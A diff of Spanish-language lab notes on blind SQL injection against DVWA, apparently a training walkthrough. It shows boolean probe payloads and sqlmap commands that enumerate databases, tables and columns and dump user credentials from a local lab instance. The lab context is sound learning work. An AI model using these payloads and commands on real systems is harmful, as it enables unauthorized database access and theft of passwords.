@@ -1,1 +1,34 @@
+++ Web Browser
+--- dvwa security = low
+--- SQL Injection (BLind) 
+--- 1 ---> Submit ---> Se muestra el mensaje de que el id 1 existe en la base de datos
+--- 1' and 1=1# ---> Se muestra el mensaje de que el id 1 existe en la base de datos
+--- 1' and 1=0# ---> Se muestra el mensaje de que el id 1 no existe en la base de datos
+----- Los resultados anteriores nos permiten inferir que la página se comporta distinto con resultados true o false, por ende existe la vulnerabilidad frente a 
+ataques del tipo sql blind injection
 
+++ SQL Map
+--- sqlmap -u "http://127.8.0.1/vulnerabilities/sqli_blind/?id=1%27+and+1%3D0%23&Submit=Submit#" --cookie=PHPSESSID=<value>; security=low" --dbs
+----- Para obtener el PHPSESSID:
+------- Clic derecho en la página
+------- Storage
+------- Copiar el PHPSESSID value
+--- Seleccionar yes (y)
+--- Seleccionar no (n)
+--- Se nos mostrarán las bases de datos disponibles
+--- Para listas todas las tablas de la base de datos dvwa ejecutamos el siguiente comando:
+------ sqlmap -u "http://127.8.0.1/vulnerabilities/sqli_blind/?id=1%27+and+1%3D0%23&Submit=Submit#" --cookie=PHPSESSID=<value>; security=low" -D dvwa --tables 
+------ Seleccionar yes (y)
+------ Seleccionar no (n)
+------ Se nos mostrarán los nombres de las tablas asociadas a la base de datos dvwa
+--- Para listar las columnas en la tabla users procedemos a ejecutar el siguiente comando:
+------ sqlmap -u "http://127.8.0.1/vulnerabilities/sqli_blind/?id=1%27+and+1%3D0%23&Submit=Submit#" --cookie=PHPSESSID=<value>; security=low" -D dvwa -T users --columns
+------ Seleccionar yes (y)
+------ Seleccionar no (n)
+------ Se nos mostrarán las columnas asociadas a la tabla users
+--- Para listar los usuarios y las contraseñas de la tabla users ejecutamos el siguiente comando:
+------ sqlmap -u "http://127.8.0.1/vulnerabilities/sqli_blind/?id=1%27+and+1%3D0%23&Submit=Submit#" --cookie=PHPSESSID=<value>; security=low" -D dvwa -T users --C user,password --dump
+------ Seleccionar yes (y)
+------ Seleccionar no (n)
+------ Se nos mostrará un listado de los registros asociados con los usuarios y las
+contraseñas
